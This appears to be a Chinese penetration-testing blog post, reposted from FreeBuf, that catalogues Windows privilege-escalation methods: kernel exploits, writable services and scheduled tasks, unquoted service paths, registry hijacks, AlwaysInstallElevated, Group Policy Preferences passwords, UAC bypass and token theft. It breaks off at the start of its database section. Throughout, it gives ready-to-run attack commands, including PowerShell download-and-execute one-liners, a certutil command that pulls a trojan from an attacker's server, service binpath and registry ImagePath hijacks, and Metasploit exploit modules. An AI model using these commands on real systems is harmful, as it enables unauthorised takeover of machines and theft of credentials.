        <content type="html"><![CDATA[<blockquote><p>freebuf链接：<br><a href="https://www.freebuf.com/articles/terminal/259256.html">https://www.freebuf.com/articles/terminal/259256.html</a></p></blockquote><hr><h2 id="简-介"><a href="#简-介" class="headerlink" title="简 介"></a>简 介</h2><p>windows在日常的渗透中经常遇到，而在内网之前，经常会在所拿到的跳板机进行提权，这样后面横向，内网才能更好的展开（抓hash，必须得系统或管理员权限），所以这里做了一次window提权总结，建议收藏，反复看，熟能生巧！</p><p>提权从目的可分为纵向提权与横向提权：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">纵向提权：低权限角色获得高权限角色的权限。（最常见的）</span><br><span class="line"></span><br><span class="line">横向提权：获取同级别角色的权限。（根据实际的需求）</span><br></pre></td></tr></table></figure><p>Windows常用的提权方法有：<br>系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、窃取令牌提权、bypassuac提权，第三方软件/服务提权，WEB中间件漏洞提权等。</p><p>提权思维导图：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1372713441.png"></p><h2 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h2><h3 id="1-系统内核溢出漏洞提权"><a href="#1-系统内核溢出漏洞提权" class="headerlink" title="1.系统内核溢出漏洞提权"></a>1.系统内核溢出漏洞提权</h3><p>简介：此提权方法是利用系统本身存在的一些系统内核溢出漏洞，但未曾打相应的补丁，攻击者通过对比systeminfo信息中的补丁信息来查找缺失的补丁号，通过缺失补丁号对照相应的系统版本查找对应可以提权提升的exp<br>注意，只要对应的补丁号加上对应的系统的版本的提权exp才可以成功，有时候如果查找到提权exp提权不成功，那么就可以查看是不是系统版本没对应上，且不排除一些提权漏洞利用需要相应的环境。</p><p>查找补丁的手法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#手工查找补丁情况</span><br><span class="line">systeminfo</span><br><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line">#MSF后渗透扫描</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br><span class="line">post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</span><br><span class="line"></span><br><span class="line">#windows exploit suggester</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;AonCyberLabs&#x2F;Windows-Exploit-Suggester</span><br><span class="line"></span><br><span class="line">#powershell中的sherlock脚本</span><br><span class="line">Import-Module C:\Sherlock.ps1 #下载ps1脚本，导入模块</span><br><span class="line">Find-AllVulns</span><br><span class="line"></span><br><span class="line">#Empire内置模块 Empire框架也提供了关于内核溢出漏洞提权的漏洞利用方法</span><br><span class="line">usemodule privesc&#x2F;powerup&#x2F;allchecks</span><br><span class="line">execute</span><br><span class="line"></span><br><span class="line">..........</span><br></pre></td></tr></table></figure><p>查找到缺失的补丁后，对照相应的系统版本，查找对应的exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;windows-kernel-exploits</span><br><span class="line">https:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Heptagrams&#x2F;Heptagram&#x2F;tree&#x2F;master&#x2F;Windows&#x2F;Elevation</span><br><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;i.hacking8.com&#x2F;tiquan&#x2F;</span><br><span class="line">...........</span><br></pre></td></tr></table></figure><h3 id="2-系统配置错误提权"><a href="#2-系统配置错误提权" class="headerlink" title="2.系统配置错误提权"></a>2.系统配置错误提权</h3><h4 id="2-1-错误权限配置"><a href="#2-1-错误权限配置" class="headerlink" title="2.1 错误权限配置"></a>2.1 错误权限配置</h4><p>简介：windows系统服务文件在操作系统启动时加载和运行，并在后台调用可执行文件。理论上，低权限用户是没有对高权限服务调用的可执行文件写权限，但是，如果因管理员错误的配置，导致一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，那么低权限用户就可以将该文件替换成任意可执行文件，这样就可以劫持系统服务，获得该系统服务的权限，而windows服务是以system权限运行的，所以低权限用户就能获得系统权限。（利用条件比较苛刻）<br>系统服务权限配置错误利用有如下两种方式：服务未启动：攻击者可以使用任意服务替换原来的服务，然后重启服务 服务正在运行且无法被终止：这种情况符合绝大多数的漏洞利用场景，攻击者通常会利用dll劫持技术并尝试重启服务来提权(需要administrtor权限)</p><p>查找错误配置的手法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#powerup提供了一些本地提权的方法，可以通过很多实用的脚本来寻找目标机器的windows服务漏洞</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PowerShellEmpire&#x2F;PowerTools&#x2F;tree&#x2F;master&#x2F;PowerUp</span><br><span class="line">可直接通过powershell远程加载</span><br><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellEmpire&#x2F;PowerTools&#x2F;master&#x2F;PowerUp&#x2F;PowerUp.ps1&#39;); Invoke-AllChecks&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#msf 对应的模块为exploit&#x2F;windows&#x2F;local&#x2F;service_permissions  但前提是获得一个会话</span><br><span class="line">run exploit&#x2F;windows&#x2F;local&#x2F;service_permissions #自动化提权，回来的的权限就是system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#当工具无法使用时，也可以手工查找，使用Windows内建工具icacls查看服务启动路径中写权限</span><br><span class="line">例如：icacls “C:\Program Files”</span><br><span class="line">icacls “C:\Program Files\Common Files”</span><br><span class="line"></span><br><span class="line">#查看指定目录的权限配置情况</span><br><span class="line">accesschk.exe -dqv &quot;D:\test&quot; -accepteula</span><br><span class="line">参数说明：“M”表示修改，“F”代表完全控制，“CI”代表从属容器将继承访问控制项，“OI”代表从属文件将继承访问控制项。</span><br><span class="line"></span><br><span class="line">#检查服务 如果是.SERVICE_ALL_ACCESS的意思是我们对“Vulnerable Service”的属性拥有完全控制权</span><br><span class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * &#x2F;accepteula</span><br><span class="line">sc qc 服务名   #查看可以完全控制的服务的属性。</span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#把服务启动的行为（exe或者脚本，com组件..）替换成我们的MSF反弹木马，当服务重启时，就会给我们返回一个system权限的meterpreter</span><br><span class="line">set AutoRunScript migrate -f#正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程</span><br><span class="line">为什么要自动迁移？</span><br><span class="line">这是因为当一个服务在Windows系统中启动后，它必须和服务控制管理器通信，如果没有通信，服务控制管理器会认为出现了错误，并会终止这个进程，我们所有需要做的就是在终止载荷进程之前，将它迁移到其它进程。</span><br><span class="line"></span><br><span class="line">#run exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</span><br><span class="line">run exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</span><br><span class="line"></span><br><span class="line">#找到我们具有完全控制权限的服务，修改服务配置执行命令</span><br><span class="line">sc config 服务名 binpath &#x3D; &quot;木马程序.exe&quot;   #INARY_PATH_NAME参数指向了该服务的可执行程序</span><br><span class="line">sc stop 服务名</span><br><span class="line">sc start 服务名</span><br><span class="line"></span><br><span class="line">这里可以用木马程序可以用exe，任意脚本，dll文件等等，具体情况具体分析</span><br></pre></td></tr></table></figure><p>这里我把计划任务目录可写也放在这里，因为计划任务也算系统服务功能。<br>简介：windows操作系统提供了一个实用程序（schtasks.exe）,使系统管理员能够在特定的时间执行程序或脚本（在大多数情况下，计划任务是以NT AuthoritySystem高权限执行的），如果地权限用户对计划任务所在目录有读写权限，完全可以替换计划任务所执行的脚本或程序，获得高权限（但需要错误配置，让此目录下其他用户可写）。<br>官方说明文档：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;windows&#x2F;desktop&#x2F;aa446802(v&#x3D;vs.85).aspx</span><br></pre></td></tr></table></figure><p>查找错误配置的手法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#schtask 查询</span><br><span class="line">schtasks &#x2F;query &#x2F;fo LIST 2&gt;nul</span><br><span class="line"></span><br><span class="line">#powershell</span><br><span class="line">Get-ScheduledTask</span><br></pre></td></tr></table></figure><p>利用手法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#进行筛选 删除包含&#x2F;Microsoft&#x2F;Windows&#x2F;路径的所有任务</span><br><span class="line">Get-ScheduledTask | Select * | ? &#123;($_.TaskPath -notlike &quot;\Microsoft\Windows\*&quot;) -And ($_.Principal.UserId -notlike &quot;*$env:UserName*&quot;)&#125; | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @&#123;Name&#x3D;&quot;User&quot;;Expression&#x3D;&#123;$_.Principal.userID&#125;&#125;</span><br><span class="line"></span><br><span class="line">#分析计划任务  查找行为，比如exe，脚本什么的</span><br><span class="line">$task&#x3D; Get-ScheduledTask -TaskName 计划任务名 </span><br><span class="line">ForEach ($triger in $task.Triggers) &#123; echo $triger.Repetition.Interval&#125;</span><br><span class="line"></span><br><span class="line">#查找计划任务行为所在目录，低权限用户是否具有可写权限  accesschk.exe  当然也可以用icacls命令</span><br><span class="line">accesschk64.exe -accepteula -wv lowuser C:\ScheduledTasks\Task1\1111.exe</span><br><span class="line"></span><br><span class="line">#直接替换</span><br><span class="line">certutil -urlcache -split -f &quot;http:&#x2F;&#x2F;你的vps&#x2F;1111.exe&quot; C:\ScheduledTasks\Task1\1111.exe</span><br><span class="line"></span><br><span class="line">#等待计划任务执行</span><br></pre></td></tr></table></figure><h4 id="2-2可信任服务路径漏洞"><a href="#2-2可信任服务路径漏洞" class="headerlink" title="2.2可信任服务路径漏洞"></a>2.2可信任服务路径漏洞</h4><p>简介：如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的。</p><p>原理：对于C:Program FilesSome FolderService.exe文件路径中的每一个空格，windows都会尝试寻找并执行名字与空格前的名字向匹配的程序。操作系统会对文件路径中空格的所有可能进行尝试，直到找到一个匹配的程序。以上面的例子为例，windows会依次尝试确定和执行下面的程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Some.exe</span><br><span class="line">C:\Program Files\Some Folder\Service.exe</span><br></pre></td></tr></table></figure><p>所以如果我们能够上传一个适当命名的恶意可执行程序在受影响的目录，比如这里我把木马名字改了Program.exe，放在c盘小,一旦此服务重启，因为优先级的缘故，服务会优先选择我们木马Program.exe，而不是C:Program FilesSome FolderService.exe，那么我们的恶意程序就会以system权限运行(大多数情况下)。</p><p>查找错误配置的手法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#wmi查找含有漏洞的服务命令</span><br><span class="line">wmic service get name,displayname,pathname,startmode|findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr&#x2F;i &#x2F;v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">#PowerUp脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PowerShellEmpire&#x2F;PowerTools&#x2F;tree&#x2F;master&#x2F;PowerUp</span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp;&#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br><span class="line"></span><br><span class="line">##查看指定目录的权限配置情况</span><br><span class="line">accesschk.exe -dqv &quot;D:\test&quot; -accepteula</span><br></pre></td></tr></table></figure><p>漏洞利用手法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#msf攻击模块</span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;trusted_service_path</span><br><span class="line">set AutoRunScript migrate -f</span><br><span class="line"></span><br><span class="line">#手动攻击</span><br><span class="line">我们需要执行的exe根据需要重命名并放置在可写入的有漏洞目录下</span><br><span class="line">然后重启服务</span><br><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure><h4 id="2-3不安全的注册表权限配置"><a href="#2-3不安全的注册表权限配置" class="headerlink" title="2.3不安全的注册表权限配置"></a>2.3不安全的注册表权限配置</h4><p>简介:在Windows中，和Windows服务有关的信息存储在HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServices注册表项中,服务对应的程序路径存储在HKEY_LOCAL_MACHINESYSTEMControlSet001ServicesVulnerable Service服务名ImagePath，如果低权限用户对这个键值有写权限，那么就可以控制这个服务，运行我们的程序，拿到高权限。</p><p>检测服务的注册表路径是否有写权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#微软的工具</span><br><span class="line">https:&#x2F;&#x2F;www.microsoft.com&#x2F;en-us&#x2F;download&#x2F;search.aspx?q&#x3D;subinacl</span><br><span class="line">subinacl.exe &#x2F;key reg &quot;HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnera</span><br></pre></td></tr></table></figure><p>利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#如果我们对注册表有写入权限，就可以修改注册表，使得服务启动时运行我们的恶意程序&#96;</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINESYSTEMControlSet001ServicesVulnerable Service360rp&quot; &#x2F;t REG_EXPAND_SZ &#x2F;v ImagePath &#x2F;d &quot;C:programdataadduser.exe&quot; &#x2F;f</span><br></pre></td></tr></table></figure><h4 id="2-4启用注册表键AlwaysInstallElevated"><a href="#2-4启用注册表键AlwaysInstallElevated" class="headerlink" title="2.4启用注册表键AlwaysInstallElevated"></a>2.4启用注册表键AlwaysInstallElevated</h4><p>简介：注册表键AlwaysInstallElevated是一个策略设置项。windows允许低权限用户以System权限运行安装文件。如果启用此策略设置项，那么任何权限用户都能以NT AUTHORITYSYSTEM权限来安装恶意的MSI(Microsoft Windows Installer)文件。</p><p>查看是否启用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#PowerUp</span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module .\PowerUp.ps1;Get-RegistryAlwaysInstallElevated&#125;&quot;</span><br><span class="line"></span><br><span class="line">#当然也可以查看注册表键值是否被定义</span><br><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#利用方法,启用AlwaysInstallElevated后，可以通过命令行调用msiexec安装msi文件，msi文件内包含要执行的Payload，Payload将会以System权限执行</span><br><span class="line">msiexec &#x2F;quiet &#x2F;qn &#x2F;i muma.msi</span><br><span class="line"></span><br><span class="line">#msf   需要一个会话</span><br><span class="line">run exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevated</span><br></pre></td></tr></table></figure><h3 id="3-组策略首选项提权"><a href="#3-组策略首选项提权" class="headerlink" title="3.组策略首选项提权"></a>3.组策略首选项提权</h3><p>简介：Windows 2008 Server引入了一项新功能：策略首选项，组策略首选项使管理员可以部署影响域中计算机/用户的特定配置，通过在组策略管理控制台中配置的组策略首选项，管理员可以推出多种策略，例如，当用户登录其计算机时自动映射网络驱动器，更新内置管理员帐户的用户名或对注册表进行更改。<br><strong>SYSVOL：</strong><br>SYSVOL是AD(活动目录)里面一个存储域公共文件服务器副本的共享文件夹，所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。</p><p>所有的组策略均存储在如下位置： <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code> </p><p><strong>组策略偏好GPP</strong><br>win2008发布了GPP(Group Policy Preferences)，其中GPP最有用的特性，是在某些场景存储和使用凭据，其中包括：映射驱动（Drives.xml）创建本地用户数据源（DataSources.xml）打印机配置（Printers.xml）创建/更新服务（Services.xml）计划任务（ScheduledTasks.xml）更改本地Administrator密码</p><p>为方便对所有机器进行操作，网络管理员会使用域策略进行统一的配置和管理，那么所有机器的本地管理员密码就是一样的，造成了即使不知道密码的情况下也能修改组策略首选项的密码，也可以通过脚本破解组策略首选项文件中密码的漏洞。</p><p>利用手法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#Powershell获取cpassword</span><br><span class="line">Get-GPPPassword.ps1</span><br><span class="line"></span><br><span class="line">#PowerSploit 的 Get-GPPPassword模块 检索通过组策略首选项推送的帐户的明文密码和其他信息。</span><br><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword</span><br><span class="line">kali gpp-decrypt命令破解密码</span><br><span class="line"></span><br><span class="line">#Msf</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp</span><br><span class="line"></span><br><span class="line">#Empire</span><br><span class="line">usemodule privesc&#x2F;gpp</span><br></pre></td></tr></table></figure><h3 id="4-bypassUAC提权"><a href="#4-bypassUAC提权" class="headerlink" title="4. bypassUAC提权"></a>4. bypassUAC提权</h3><p>简介：bypassUAC已经是老生长谈的话题了，用户帐户控制(UAC)，它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。<br><strong>UAC如何运行？</strong><br>UAC通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被“提升权限”，而不是以管理员身份运行的程序。</p><p>一些没有管理员权限无法完成的操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">注册表修改（如果注册表项在HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的）</span><br><span class="line"></span><br><span class="line">加载设备驱动程序</span><br><span class="line"></span><br><span class="line">DLL注入</span><br><span class="line"></span><br><span class="line">修改系统时间（时钟）</span><br><span class="line"></span><br><span class="line">修改用户帐户控制设置（通过注册表，可以启用&#x2F;禁用该设置，但您需要正确的权限才能执行此操作）</span><br><span class="line"></span><br><span class="line">修改受保护的目录（例如Windows文件夹，Program Files）</span><br><span class="line"></span><br><span class="line">计划任务（例如，以管理员权限自动启动）</span><br></pre></td></tr></table></figure><p>UAC不会自动阻止恶意软件，其目的不是确定程序是否是恶意软件，而是在没有用户许可下对恶意软件的未授权行为进行掌控。</p><p>利用手法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#Msf</span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;ask       #弹出UAC确认窗口，点击后获得system权限</span><br><span class="line"></span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac  #此模块将通过进程注入使用可信任发布者证书绕过Windows UAC，它将生成关闭UAC标志的第二个shell。</span><br><span class="line"></span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection #此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload 二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。如果指定exe::custom，应在单独的进程中启动 payload 后调用ExitProcess（）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_fodhelper#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定exe:custom，则应在单独的进程中启动payload后调用ExitProcess（）。</span><br><span class="line"></span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_eventvwr#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（）</span><br><span class="line"></span><br><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_comhijack#此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL,这些DLL包含导致会话权限提升的payload。此模块修改注册表项，但在调用payload后将清除该项,这个模块需要payload的体系架构和操作系统匹配，但是当前的低权限meterpreter会话体系架构中可能不同。如果指定exe:：custom，则应在单独的进程中启动payloa后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件,因此，如果cmd.exe访问受到限制，此模块将无法正常运行。</span><br><span class="line"></span><br><span class="line">#Powershell</span><br><span class="line">Invoke-PsUACme</span><br><span class="line"></span><br><span class="line">#Empire</span><br><span class="line">usemodule privesc&#x2F;bypassuac</span><br><span class="line">usemodule privesc&#x2F;bypassuac_wscript</span><br><span class="line"></span><br><span class="line">#cs</span><br><span class="line">uac-dll</span><br><span class="line">uac-token-duplication</span><br><span class="line">....</span><br></pre></td></tr></table></figure><h3 id="5-令牌窃取"><a href="#5-令牌窃取" class="headerlink" title="5.令牌窃取"></a>5.令牌窃取</h3><p>简介：令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。</p><p>令牌有很多种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">访问令牌(Access Token)：表示访问控制操作主体的系统对象 。</span><br><span class="line"></span><br><span class="line">会话令牌(Session Token)：是交互会话中唯一的身份标识符。</span><br><span class="line"></span><br><span class="line">密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾。</span><br></pre></td></tr></table></figure><p>利用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#msf 拿到一个会话</span><br><span class="line">use incognito           #进入incognito模块</span><br><span class="line">list_tokens -u          #列出令牌</span><br><span class="line">Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</span><br><span class="line">Impresonation Token：模拟令牌，它是非交互的会话。</span><br><span class="line"></span><br><span class="line">这里窃取令牌，主要是窃取进程中的令牌</span><br><span class="line">#使用令牌假冒用户</span><br><span class="line">impresonate_Token &quot;令牌名&quot;</span><br><span class="line">......</span><br><span class="line">这里也可以用其他的cs，empire上面的令牌窃取功能模块</span><br></pre></td></tr></table></figure><p>说起令牌，让我想到了土豆（加模仿高权限令牌）！！！！这玩意真好用，真牛逼！</p><p>项目地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;breenmachine&#x2F;RottenPotatoNG&#x2F;</span><br></pre></td></tr></table></figure><p>RottenPotato(烂土豆）提权的原理可以简述如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</span><br><span class="line"></span><br><span class="line">对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌（过程为通过一系列的Windows API调用）。</span><br><span class="line"></span><br><span class="line">模仿这个令牌，只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌，一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</span><br></pre></td></tr></table></figure><p>当然土豆系列都牛逼class！附上甜土豆github地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;CCob&#x2F;SweetPotato</span><br></pre></td></tr></table></figure><h3 id="6-数据库提权："><a href="#6-数据库提权：" class="headerlink" title="6.数据库提权："></a>6.数据库提权：</h3><p>在windows上经常会装这两个数据库：sqlserver数据库提权、MySQL数据库提权</p><p>所以直接针对这两个数据库进行提权。<br>MSSQL提权：</p><p>启用xp_cmdshell（高权限用户）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 